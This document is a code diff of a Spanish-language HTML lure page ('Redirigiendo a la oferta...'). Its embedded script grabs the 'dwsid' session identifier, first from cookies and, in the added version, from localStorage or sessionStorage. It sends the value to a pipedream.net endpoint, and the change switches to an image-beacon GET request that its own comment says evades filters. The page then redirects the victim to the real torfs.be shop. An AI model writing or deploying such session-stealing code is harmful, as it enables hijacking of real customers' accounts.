@@ -6,29 +6,19 @@
 </head>
 <body>
   <h1>Redirigiendo a la oferta...</h1>
-
   <script>
-    // Extraer el valor de la cookie dwsid
-    const match = document.cookie.match(/(?:^|; )dwsid=([^;]*)/);
-    const dwsid = match ? match[1] : "";
+    // Captura el dwsid desde localStorage o sessionStorage
+    const dwsid = localStorage.getItem('dwsid') || sessionStorage.getItem('dwsid') || 'none';
 
-    // Enviar la cookie al endpoint si existe
-    if (dwsid) {
-      fetch("https://eoozwutroaqr7ij.m.pipedream.net", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: "cookie=" + encodeURIComponent(dwsid)
-      })
-      .then(() => {
-        // Redirigir a la víctima al sitio real
-        window.location.href = "https://www.torfs.be";
-      });
-    } else {
-      // Si no hay dwsid, solo redirigir
+    // Envía el dwsid a Pipedream usando una solicitud GET para evadir filtros
+    const url = "https://eoozwutroaqr7ij.m.pipedream.net?dwsid=" + encodeURIComponent(dwsid);
+    const img = new Image();
+    img.src = url;
+
+    // Redirige a torfs.be después de un breve retraso
+    setTimeout(() => {
       window.location.href = "https://www.torfs.be";
-    }
+    }, 1000);
   </script>
 </body>
 </html>
